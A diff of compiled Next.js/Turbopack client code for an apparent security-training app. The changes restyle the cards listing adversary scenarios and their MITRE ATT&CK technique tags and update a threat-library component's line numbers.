-                            lineNumber: 139,
+                            lineNumber: 293,
                             columnNumber: 25
                         }, this),
                         /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
@@ -1024,32 +1297,32 @@ function ThreatLibrary() {
                                 ]
                             }, void 0, true, {
                                 fileName: "[project]/src/components/ThreatLibrary.tsx",
-                                lineNumber: 143,
+                                lineNumber: 297,
                                 columnNumber: 29
                             }, this)
                         }, void 0, false, {
                             fileName: "[project]/src/components/ThreatLibrary.tsx",
-                            lineNumber: 142,
+                            lineNumber: 296,
                             columnNumber: 25
                         }, this)
                     ]
                 }, actor.id, true, {
                     fileName: "[project]/src/components/ThreatLibrary.tsx",
-                    lineNumber: 124,
+                    lineNumber: 278,
                     columnNumber: 21
                 }, this))
         }, void 0, false, {
             fileName: "[project]/src/components/ThreatLibrary.tsx",
-            lineNumber: 122,
+            lineNumber: 276,
             columnNumber: 13
         }, this)
     }, void 0, false, {
         fileName: "[project]/src/components/ThreatLibrary.tsx",
-        lineNumber: 121,
+        lineNumber: 275,
         columnNumber: 9
     }, this);
 }
-_s(ThreatLibrary, "SDmRqsSoszEAFqad5usxYDojFK8=");
+_s(ThreatLibrary, "6oveS9ooYYEotNdl35irgKKpYmg=");
 _c = ThreatLibrary;
 var _c;
 __turbopack_context__.k.register(_c, "ThreatLibrary");
@@ -1142,131 +1415,152 @@ function Home() {
                 lineNumber: 56,
                 columnNumber: 9
             }, this) : /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("section", {
-                className: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$app$2f$page$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__["default"].scenariosGrid,
-                children: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$types$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__["SCENARIOS"].map((scenario)=>/*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
-                        className: "card",
-                        children: [
-                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
-                                style: {
-                                    display: 'flex',
-                                    justifyContent: 'space-between',
-                                    alignItems: 'start',
-                                    marginBottom: '1rem'
-                                },
-                                children: [
-                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
-                                        className: `mono ${__TURBOPACK__imported__module__$5b$project$5d2f$src$2f$app$2f$page$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__["default"].badge}`,
-                                        children: scenario.adversary
-                                    }, void 0, false, {
-                                        fileName: "[project]/src/app/page.tsx",
-                                        lineNumber: 62,
-                                        columnNumber: 17
-                                    }, this),
-                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
-                                        className: "text-dim mono",
-                                        style: {
-                                            fontSize: '0.8rem'
-                                        },
-                                        children: scenario.difficulty
-                                    }, void 0, false, {
-                                        fileName: "[project]/src/app/page.tsx",
-                                        lineNumber: 63,
-                                        columnNumber: 17
-                                    }, this)
-                                ]
-                            }, void 0, true, {
-                                fileName: "[project]/src/app/page.tsx",
-                                lineNumber: 61,
-                                columnNumber: 15
-                            }, this),
-                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("h2", {
-                                className: "mono text-primary",
-                                style: {
-                                    fontSize: '1.25rem',
-                                    marginBottom: '0.5rem'
-                                },
-                                children: scenario.name
-                            }, void 0, false, {
-                                fileName: "[project]/src/app/page.tsx",
-                                lineNumber: 66,
-                                columnNumber: 15
-                            }, this),
-                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
-                                className: "text-dim",
-                                style: {
-                                    fontSize: '0.9rem',
-                                    marginBottom: '1.5rem',
-                                    lineHeight: '1.6'
-                                },
-                                children: scenario.description
-                            }, void 0, false, {
-                                fileName: "[project]/src/app/page.tsx",
-                                lineNumber: 69,
-                                columnNumber: 15
-                            }, this),
-                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
-                                style: {
-                                    marginBottom: '1.5rem'
-                                },
-                                children: [
-                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
-                                        className: "mono text-dim",
-                                        style: {
-                                            fontSize: '0.75rem',
-                                            marginBottom: '0.5rem'
-                                        },
-                                        children: "MITRE ATT&CK:"
-                                    }, void 0, false, {
-                                        fileName: "[project]/src/app/page.tsx",
-                                        lineNumber: 74,
-                                        columnNumber: 17
-                                    }, this),
-                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
-                                        style: {
-                                            display: 'flex',
-                                            gap: '0.5rem',
-                                            flexWrap: 'wrap'
-                                        },
-                                        children: scenario.mitreTechniques.map((tech)=>/*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
-                                                className: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$app$2f$page$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__["default"].tag,
-                                                title: tech.name,
-                                                children: tech.id
-                                            }, tech.id, false, {
-                                                fileName: "[project]/src/app/page.tsx",
-                                                lineNumber: 77,
-                                                columnNumber: 21
-                                            }, this))
-                                    }, void 0, false, {
-                                        fileName: "[project]/src/app/page.tsx",
-                                        lineNumber: 75,
-                                        columnNumber: 17
-                                    }, this)
-                                ]
-                            }, void 0, true, {
-                                fileName: "[project]/src/app/page.tsx",
-                                lineNumber: 73,
-                                columnNumber: 15
-                            }, this),
-                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$client$2f$app$2d$dir$2f$link$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["default"], {
-                                href: `/scenario/${scenario.id}`,
-                                className: "btn",
-                                style: {
-                                    display: 'block',
-                                    textAlign: 'center',
-                                    textDecoration: 'none'
-                                },
-                                children: "INITIALIZE"
-                            }, void 0, false, {
-                                fileName: "[project]/src/app/page.tsx",
-                                lineNumber: 84,
-                                columnNumber: 15
-                            }, this)
-                        ]
-                    }, scenario.id, true, {
-                        fileName: "[project]/src/app/page.tsx",
-                        lineNumber: 60,
-                        columnNumber: 13
-                    }, this))
+                style: {
+                    animation: 'fadeIn 0.3s ease'
+                },
+                children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
+                    className: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$app$2f$page$2e$module$2e$css__$5b$app$2d$client$5d$__$28$css__module$29$__["default"].scenariosGrid,
+                    children: __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$types$2e$ts__$5b$app$2d$client$5d$__$28$ecmascript$29$__["SCENARIOS"].map((scenario)=>/*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
+                            className: "card",
+                            style: {
+                                border: '1px solid #333'
+                            },
+                            onMouseEnter: (e)=>e.currentTarget.style.borderColor = 'var(--primary)',
+                            onMouseLeave: (e)=>e.currentTarget.style.borderColor = '#333',
+                            children: [
+                                /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
+                                    style: {
+                                        display: 'flex',
+                                        justifyContent: 'space-between',
+                                        alignItems: 'center',
+                                        marginBottom: '1rem'
+                                    },
+                                    children: [
+                                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
+                                            className: "badge",
+                                            style: {
+                                                color: 'var(--secondary)',
+                                                borderColor: 'var(--secondary)'
+                                            },
+                                            children: scenario.adversary
+                                        }, void 0, false, {
+                                            fileName: "[project]/src/app/page.tsx",
+                                            lineNumber: 65,
+                                            columnNumber: 19
+                                        }, this),
+                                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
+                                            className: "mono text-dim",
+                                            style: {
+                                                fontSize: '0.8rem'
+                                            },
+                                            children: scenario.difficulty
+                                        }, void 0, false, {
+                                            fileName: "[project]/src/app/page.tsx",
+                                            lineNumber: 66,
+                                            columnNumber: 19
+                                        }, this)
+                                    ]
+                                }, void 0, true, {
+                                    fileName: "[project]/src/app/page.tsx",
+                                    lineNumber: 64,
+                                    columnNumber: 17
+                                }, this),
+                                /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("h2", {
+                                    className: "mono text-primary",
+                                    style: {
+                                        fontSize: '1.2rem',
+                                        marginBottom: '0.5rem'
+                                    },
+                                    children: scenario.name
+                                }, void 0, false, {
+                                    fileName: "[project]/src/app/page.tsx",
+                                    lineNumber: 69,
+                                    columnNumber: 17
+                                }, this),
+                                /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
+                                    className: "text-dim",
+                                    style: {
+                                        fontSize: '0.9rem',
+                                        marginBottom: '1.5rem',
+                                        lineHeight: '1.5'
+                                    },
+                                    children: [
+                                        scenario.description.substring(0, 120),
+                                        "..."
+                                    ]
+                                }, void 0, true, {
+                                    fileName: "[project]/src/app/page.tsx",
+                                    lineNumber: 72,
+                                    columnNumber: 17
+                                }, this),
+                                /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
+                                    style: {
+                                        marginBottom: '1.5rem'
+                                    },
+                                    children: [
+                                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("p", {
+                                            className: "mono text-dim",
+                                            style: {
+                                                fontSize: '0.75rem',
+                                                marginBottom: '0.5rem'
+                                            },
+                                            children: "MITRE ATT&CK:"
+                                        }, void 0, false, {
+                                            fileName: "[project]/src/app/page.tsx",
+                                            lineNumber: 77,
+                                            columnNumber: 19
+                                        }, this),
+                                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
+                                            style: {
+                                                display: 'flex',
+                                                gap: '0.5rem',
+                                                flexWrap: 'wrap'
+                                            },
+                                            children: scenario.mitreTechniques.map((tech)=>/*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])("span", {
+                                                    className: "tag",
+                                                    title: tech.name,
+                                                    children: tech.id
+                                                }, tech.id, false, {
+                                                    fileName: "[project]/src/app/page.tsx",
+                                                    lineNumber: 80,
+                                                    columnNumber: 23
+                                                }, this))
+                                        }, void 0, false, {
+                                            fileName: "[project]/src/app/page.tsx",
+                                            lineNumber: 78,
+                                            columnNumber: 19
+                                        }, this)
+                                    ]
+                                }, void 0, true, {
+                                    fileName: "[project]/src/app/page.tsx",
+                                    lineNumber: 76,
+                                    columnNumber: 17
+                                }, this),
+                                /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$compiled$2f$react$2f$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["jsxDEV"])(__TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$client$2f$app$2d$dir$2f$link$2e$js__$5b$app$2d$client$5d$__$28$ecmascript$29$__["default"], {
+                                    href: `/scenario/${scenario.id}`,
+                                    className: "btn",
+                                    style: {
+                                        display: 'block',
+                                        textAlign: 'center',
+                                        textDecoration: 'none'
+                                    },
+                                    children: "INITIALIZE"
+                                }, void 0, false, {
+                                    fileName: "[project]/src/app/page.tsx",
+                                    lineNumber: 87,
+                                    columnNumber: 17
+                                }, this)
+                            ]
+                        }, scenario.id, true, {
+                            fileName: "[project]/src/app/page.tsx",
+                            lineNumber: 61,
+                            columnNumber: 15
+                        }, this))
+                }, void 0, false, {
+                    fileName: "[project]/src/app/page.tsx",
+                    lineNumber: 59,
+                    columnNumber: 11
+                }, this)
             }, void 0, false, {
                 fileName: "[project]/src/app/page.tsx",
                 lineNumber: 58,
